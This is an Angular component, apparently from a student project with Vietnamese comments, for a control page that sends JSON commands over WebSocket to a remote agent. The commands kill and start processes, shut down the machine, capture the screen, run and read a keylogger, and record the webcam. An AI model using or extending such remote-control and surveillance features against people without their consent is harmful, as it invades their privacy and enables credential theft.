// src/app/pages/agent-detail/agent-detail.ts
import { Component, OnInit, inject, effect } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { AgentService } from '../../services/agent.service';
import { WebSocketService } from '../../services/websocket.service';

import { NgIf, NgFor, NgClass, JsonPipe } from '@angular/common';
import { FormsModule } from '@angular/forms';

type ModuleName = 'PROCESS' | 'SYSTEM' | 'SCREEN' | 'APP' | 'KEYLOGGER' | 'WEBCAM' | null;

@Component({
  selector: 'app-agent-detail',
  standalone: true,
  imports: [NgIf, NgFor, NgClass, FormsModule, JsonPipe],
  templateUrl: './agent-detail.html'
})
export class AgentDetailPage implements OnInit {
  ws = inject(WebSocketService);
  route = inject(ActivatedRoute);
  agentService = inject(AgentService);

  agent: any = null;
  agentId = '';

  // JSON thô để test
  rawJson = '{\n  "module": "PROCESS",\n  "command": "LIST"\n}';

  // hiển thị kết quả / gói tin cuối cùng
  lastResponse: any = null;

  // module đang được chọn trong khu Modules
  selectedModule: ModuleName = null;

  // dữ liệu demo cho một số module (nếu agent có trả về)
  processList: any[] = [];
  appList: any[] = [];
  keylogEntries: any[] = [];

  ngOnInit(): void {
    // lấy ID agent từ URL
    this.agentId = this.route.snapshot.params['id'];

    // load thông tin agent
    this.agentService.getAgents().subscribe(list => {
      this.agent = list.find(a => a.machineId === this.agentId);
    });

    // theo dõi WebSocket lastMessage() (signal)
    effect(() => {
      const msg = this.ws.lastMessage();
      if (!msg) {
        return;
      }
      this.lastResponse = msg;

      // nếu backend có trả đúng format thì mấy đoạn dưới sẽ tự fill table
      if (msg.module === 'PROCESS' && msg.command === 'LIST' && Array.isArray(msg.data)) {
        this.processList = msg.data;
      }

      if (msg.module === 'APP' && msg.command === 'LIST_APPS' && Array.isArray(msg.data)) {
        this.appList = msg.data;
      }

      if (msg.module === 'KEYLOGGER' && msg.command === 'GET_LOG' && Array.isArray(msg.data)) {
        this.keylogEntries = msg.data;
      }
    });
  }

  // ================== WebSocket ==================

  connectWS(): void {
    if (!this.agent) {
      return;
    }
    const url = `ws://${this.agent.ip}:${this.agent.wsPort}`;
    console.log('Connecting to:', url);
    this.ws.connect(url);
  }

  private ensureConnected(): boolean {
    if (!this.ws.isConnected()) {
      alert('Vui lòng kết nối WebSocket trước (nút "Kết nối WebSocket").');
      return false;
    }
    return true;
  }

  // helper gửi command theo format nhóm
  private sendCommand(module: string, command: string, extra: Record<string, any> = {}): void {
    if (!this.ensureConnected()) {
      return;
    }
    const payload = {
      module,
      command,
      ...extra
    };
    console.log('Sending WS payload:', payload);
    this.ws.send(payload);
  }

  // ================== JSON thô ==================

  sendRawJson(): void {
    if (!this.ensureConnected()) {
      return;
    }
    try {
      const obj = JSON.parse(this.rawJson);
      this.ws.send(obj);
    } catch (e) {
      alert('JSON không hợp lệ, hãy kiểm tra lại cú pháp.');
    }
  }

  // ================== Modules UI ==================

  openModule(module: ModuleName): void {
    this.selectedModule = module;
  }

  backToModules(): void {
    this.selectedModule = null;
  }

  // -------- PROCESS --------
  sendProcessList(): void {
    this.sendCommand('PROCESS', 'LIST');
  }

  sendProcessKill(): void {
    const pidStr = prompt('Nhập PID cần KILL:');
    if (!pidStr) {
      return;
    }
    const pid = Number(pidStr);
    if (Number.isNaN(pid)) {
      alert('PID không hợp lệ');
      return;
    }
    this.sendCommand('PROCESS', 'KILL', { pid });
  }

  sendProcessStart(): void {
    const path = prompt('Nhập đường dẫn / tên file để START (ví dụ: notepad.exe):', 'notepad.exe');
    if (!path) {
      return;
    }
    const args = prompt('Nhập arguments (có thể để trống):', '') ?? '';
    this.sendCommand('PROCESS', 'START', { path, args });
  }

  // -------- SYSTEM --------
  sendSystemShutdown(): void {
    this.sendCommand('SYSTEM', 'SHUTDOWN', { force: true });
  }

  sendSystemRestart(): void {
    this.sendCommand('SYSTEM', 'RESTART', { force: true });
  }

  sendSystemLogoff(): void {
    this.sendCommand('SYSTEM', 'LOGOFF', {});
  }

  sendSystemLock(): void {
    this.sendCommand('SYSTEM', 'LOCK', {});
  }

  // -------- SCREEN --------
  sendScreenCapture(): void {
    this.sendCommand('SCREEN', 'CAPTURE', { format: 'png', scale: 1.0 });
  }

  // -------- APP --------
  sendAppList(): void {
    this.sendCommand('APP', 'LIST_APPS');
  }

  sendAppStart(): void {
    const appId = prompt('Nhập app_id cần START (ví dụ: notepad):', 'notepad');
    if (!appId) {
      return;
    }
    this.sendCommand('APP', 'START_APP', { app_id: appId });
  }

  // -------- KEYLOGGER --------
  sendKeyloggerStart(): void {
    this.sendCommand('KEYLOGGER', 'START_LOG');
  }

  sendKeyloggerStop(): void {
    this.sendCommand('KEYLOGGER', 'STOP_LOG');
  }

  sendKeyloggerGetLog(): void {
    const sinceStr = prompt('Lấy log từ id (since_id), mặc định 0:', '0') ?? '0';
    const since_id = Number(sinceStr);
    this.sendCommand('KEYLOGGER', 'GET_LOG', { since_id });
  }

  // -------- WEBCAM --------
  sendWebcamCapturePhoto(): void {
    this.sendCommand('WEBCAM', 'CAPTURE_PHOTO');
  }

  sendWebcamRecordVideo(): void {
    const durStr = prompt('Thời lượng video (giây):', '10') ?? '10';
    const duration_sec = Number(durStr);
    this.sendCommand('WEBCAM', 'RECORD_VIDEO', { duration_sec });
  }
}
